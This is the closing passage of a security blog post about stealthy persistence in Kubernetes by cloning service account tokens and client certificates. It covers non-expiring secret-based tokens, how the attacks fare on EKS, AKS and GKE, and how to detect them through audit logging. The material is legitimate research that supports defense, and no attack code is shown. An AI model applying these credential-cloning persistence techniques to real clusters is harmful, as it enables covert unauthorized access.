persistentvolumeclaims                          []                                    []                 [get list update watch]
storageclasses.storage.k8s.io                   []                                    []                 [get list watch]
nodes                                           []                                    []                 [get list]
</span></code></pre></div></div>

<p>Decoding the token we see something interesting about the old secrets based tokens, which is… no <code class="language-plaintext highlighter-rouge">exp</code> parameter, as they don’t expire!</p>

<p><img src="https://raesene.github.io/assets/media/pvbsecrettoken.png" alt="jwt token issued for the persistent volume binder service account" /></p>

<h3 id="gke-v1247-gke900-3">GKE v1.24.7-gke.900</h3>

<p>This technique doesn’t work in GKE as there are no secrets for service accounts in 1.24</p>

<h2 id="preventing-and-detecting-these-attacks">Preventing and detecting these attacks</h2>

<p>If you’re on the cluster operator side of things, how would you prevent or detect these attacks? Both service account tokens and client certificates are part of core Kubernetes and can’t be disabled. Client certificate can’t be revoked and revoking service account tokens requires deleting the attached service account, which is tricky if what’s been cloned is a core service account.</p>

<p>I could give the standard security answer of “just make sure people don’t have access to those APIs” but that’s probably not very practical in reality for a lot of clusters.</p>

<p>Keeping the API server off the Internet would definitely help as it makes it harder for the attacker to use their cloned credentials.</p>

<p>In terms of detecting this, the obvious suggestion is Kubernetes audit logging. First, make sure you have it enabled! Then look at any access to the CSR API and the TokenRequest API. Finding the attacker using their cloned accounts is tricky as the audit service doesn’t denote anything about the credential used, so you can’t tell the difference between a legitimate service account use and an attacker’s cloned service account token, for example.</p>

<h2 id="conclusion">Conclusion</h2>

<p>There’s a couple of interesting points in this (for me). First up is the difference in how well the techniques work in different cluster types. EKS appears to have the most restrictive setup and has reduced the efficacy of these attacks quite a bit, although it’s current version still allows for the older secret based attack. AKS and GKE both allow the attacks to work, although GKE does mitigate the new service account token attacks by limiting the maximum duration of issued tokens.</p>

<p>Here’s a matrix of our attacks and how they work in the different clusters we tested.</p>

<p><img src="https://raesene.github.io/assets/media/attackmatrix.png" alt="Attack matrix" /></p>


	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="https://raesene.github.io/categories/index.html#Kubernetes-ref">
					Kubernetes <span>(48)</span>
					
				</a></li>
			
		  
		</ul>
		  

		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Attack of the clones - Stealthy Kubernetes persistence with eathar, tòcan and teisteanas&via=raesene"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
        <h4 class="section-title author-name">raesene</h4>
        <p class="author-bio">Security Geek, Kubernetes, Docker, Ruby, Hillwalking</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="https://raesene.github.io/blog/2022/12/20/PCI-Kubernetes-Section16-Segmentation/" title="PCI Compliance for Kubernetes in detail - Part 16 - Segmentation">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="https://raesene.github.io/blog/2023/01/02/Fun-with-SSRF-Turning-the-Kubernetes-API-server-into-a-port-scanner/" title="Fun with SSRF - Turning the Kubernetes API Server into a port scanner">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2023 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
</body>
</html>


